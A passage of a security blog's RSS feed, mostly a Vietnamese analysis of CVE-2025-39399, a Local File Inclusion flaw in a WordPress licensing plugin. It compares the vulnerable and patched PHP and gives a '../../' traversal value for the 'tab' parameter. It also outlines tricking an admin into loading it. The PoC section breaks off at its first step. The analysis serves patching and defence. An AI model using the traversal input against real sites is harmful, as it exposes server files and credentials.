viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng include tr·ª±c ti·∫øp&lt;/strong&gt; d·ªØ li·ªáu t·ª´ request.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;strong&gt;realpath() / basename() / whitelist / ki·ªÉm tra base_dir&lt;/strong&gt; tr∆∞·ªõc khi include.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; kh√¥ng ƒë·ªß ƒë·ªÉ ngƒÉn traversal.&lt;/li&gt;&#xA;&lt;li&gt;Log poisoning (User‚ÄëAgent, Referer‚Ä¶) c√≥ th·ªÉ t·∫°o ngu·ªìn payload cho LFI ‚Äî kh√¥ng ghi th√¥ n·ªôi dung c√≥ th·ªÉ ƒë∆∞·ª£c include sau n√†y.&lt;/li&gt;&#xA;&lt;li&gt;V√° ph·∫£i k·∫øt h·ª£p: sanitize + canonicalize + gi·ªõi h·∫°n th∆∞ m·ª•c + ki·ªÉm so√°t quy·ªÅn ghi log.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hide-my-wp/vulnerability/wordpress-hide-my-wp-ghost-plugin-5-4-01-local-file-inclusion-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Hide My WP Ghost Plugin &amp;lt;= 5.4.01 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39399 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/</link>
      <pubDate>Fri, 17 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;License For Envato&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 1.0.0&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39399&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39399&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/license-envato/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress License For Envato Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;License For Envato&lt;/strong&gt;: &lt;strong&gt;1.0.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.1.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php $action = isset( $_GET[&amp;#39;tab&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;tab&amp;#39;] ) : &amp;#39;general&amp;#39;; ?&amp;gt;&#xA;    // other logic&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        $template = &amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;;&#xA;    }&#xA;&#xA;    if ( file_exists( $template ) ) {&#xA;        include $template;&#xA;    }else{&#xA;        include &amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;;&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã c·ªßa bi·∫øn &lt;code&gt;$action&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ tham s·ªë &lt;code&gt;$_GET[&#39;tab&#39;]&lt;/code&gt;. M·∫∑c d√π bi·∫øn n√†y ƒë∆∞·ª£c x·ª≠ l√Ω qua h√†m &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, h√†m n√†y ch·ªâ lo·∫°i b·ªè th·∫ª HTML - &lt;strong&gt;ch·ª© kh√¥ng ngƒÉn ch·∫∑n c√°c chu·ªói traversal nh∆∞ &lt;code&gt;../&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Do ƒë√≥, attacker c√≥ th·ªÉ truy·ªÅn v√†o m·ªôt gi√° tr·ªã nh∆∞ &lt;code&gt;?tab=../../somefile&lt;/code&gt;, khi·∫øn &lt;code&gt;$action&lt;/code&gt; ch·ª©a ƒë∆∞·ªùng d·∫´n ngo√†i mong ƒë·ª£i. Khi bi·∫øn n√†y ƒë∆∞·ª£c n·ªëi v√†o &lt;code&gt;$template&lt;/code&gt; v√† sau ƒë√≥ ƒë∆∞·ª£c &lt;code&gt;include&lt;/code&gt; =&amp;gt; X·∫£y ra LFI.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// Exit if accessed directly&#xA;defined(&amp;#39;ABSPATH&amp;#39;) || exit;&#xA;&#xA;// Define allowed tab values to prevent LFI&#xA;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;// Apply filter to allow extensions to add their own tabs&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&#xA;&#xA;// Verify nonce if tab parameter is set&#xA;$action = &amp;#39;general&amp;#39;;&#xA;if (isset($_GET[&amp;#39;tab&amp;#39;])) {&#xA;    // Verify nonce for tab switching if provided&#xA;    if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_text_field(wp_unslash($_GET[&amp;#39;_wpnonce&amp;#39;])), &amp;#39;license_envato_switch_tab&amp;#39;)) {&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    } elseif (!isset($_GET[&amp;#39;_wpnonce&amp;#39;])) {&#xA;        // If no nonce is provided, still allow tab switching but sanitize input&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    }&#xA;}&#xA;?&amp;gt;&#xA;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        // Ensure we only include files within the plugin directory structure&#xA;        $template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;        $nav_view_dir = realpath($licenseEnvato_nav_view);&#xA;        &#xA;        // Verify the template is a child of the nav view directory to prevent path traversal&#xA;        if ($template &amp;amp;&amp;amp; $nav_view_dir &amp;amp;&amp;amp; strpos($template, $nav_view_dir) === 0 &amp;amp;&amp;amp; file_exists($template)) {&#xA;            include $template;&#xA;        } else {&#xA;            // Fallback to general.php with the same security checks&#xA;            $general_template = realpath(&amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;);&#xA;            if ($general_template &amp;amp;&amp;amp; strpos($general_template, $nav_view_dir) === 0) {&#xA;                include $general_template;&#xA;            }&#xA;        }&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ th·ª±c hi·ªán nhi·ªÅu bi·ªán ph√°p ƒë·ªÉ ngƒÉn ch·∫∑n l·ªó h·ªïng &lt;strong&gt;LFI&lt;/strong&gt; v√† c·ªßng c·ªë t√≠nh b·∫£o m·∫≠t c·ªßa ph·∫ßn x·ª≠ l√Ω tham s·ªë tab:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng whitelist &lt;code&gt;$allowed_tabs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra nonce ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(..., &amp;#39;license_envato_switch_tab&amp;#39;))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L√Ω do CVE ƒë∆∞·ª£c g√°n l√† &lt;strong&gt;Unauthenticated&lt;/strong&gt; l√† v√¨ k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn t√†i kho·∫£n ri√™ng tr√™n site m·ª•c ti√™u ƒë·ªÉ khai th√°c. K·ªπ thu·∫≠t ph·ªï bi·∫øn l√† l·ª´a m·ªôt admin (ho·∫∑c ng∆∞·ªùi c√≥ quy·ªÅn) truy c·∫≠p trang web ch·ª©a payload. Khi admin m·ªü trang ƒë√≥, tr√¨nh duy·ªát s·∫Ω g·ª≠i y√™u c·∫ßu t·ªõi site WordPress k√®m cookie phi√™n ƒëang c√≤n hi·ªáu l·ª±c - do ƒë√≥ y√™u c·∫ßu ƒë∆∞·ª£c coi l√† ƒë√£ x√°c th·ª±c l√† t·ª´ admin. N·∫øu plugin nh·∫≠n v√† th·ª±c thi tham s·ªë m√† kh√¥ng ki·ªÉm tra nonce ho·∫∑c quy·ªÅn truy c·∫≠p, payload LFI s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† d·∫´n t·ªõi l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Chu·∫©n h√≥a v√† ki·ªÉm tra ƒë∆∞·ªùng d·∫´n b·∫±ng &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath()&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;$nav_view_dir = realpath($licenseEnvato_nav_view);&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function plugin_page() {&#xA;    $license_envato_api = new EnvatoLicenseApiCall();&#xA;    $settingsView = __DIR__ . &amp;#39;/views/settingsView.php&amp;#39;;&#xA;    if ( file_exists( $settingsView ) ) {&#xA;        include $settingsView;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;settingsView.php&lt;/code&gt; lu√¥n t·ªìn t·∫°i trong m√£ ngu·ªìn n√™n ch·∫Øc ch·∫Øn ƒë∆∞·ª£c &lt;code&gt;include&lt;/code&gt; trong h√†m &lt;code&gt;plugin_page()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function admin_menu() {&#xA;    $parent_slug = &amp;#39;licenseenvato&amp;#39;;&#xA;    $capability = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;    add_submenu_page( $parent_slug, __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), $capability, $parent_slug.&amp;#39;-settings&amp;#39;, [ $this, &amp;#39;settings&amp;#39; ] );&#xA;}&#xA;&#xA;public function settings() {&#xA;    $settings = new Settings();&#xA;    $settings-&amp;gt;plugin_page();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;plugin_page()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa submenu ‚ÄúSettings‚Äù, ƒë∆∞·ª£c ƒëƒÉng k√Ω trong h√†m &lt;code&gt;admin_menu()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Submenu n√†y c√≥ quy·ªÅn truy c·∫≠p &lt;code&gt;manage_options&lt;/code&gt;, n√™n ch·ªâ hi·ªÉn th·ªã v·ªõi admin. Khi admin m·ªü trang con &lt;code&gt;‚ÄúSettings‚Äù&lt;/code&gt; (endpoint &lt;code&gt;licenseenvato-settings&lt;/code&gt;), WordPress s·∫Ω g·ªçi &lt;code&gt;settings()&lt;/code&gt;, t·ª´ ƒë√≥ kh·ªüi t·∫°o l·ªõp &lt;code&gt;Settings&lt;/code&gt; v√† ch·∫°y &lt;code&gt;plugin_page()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 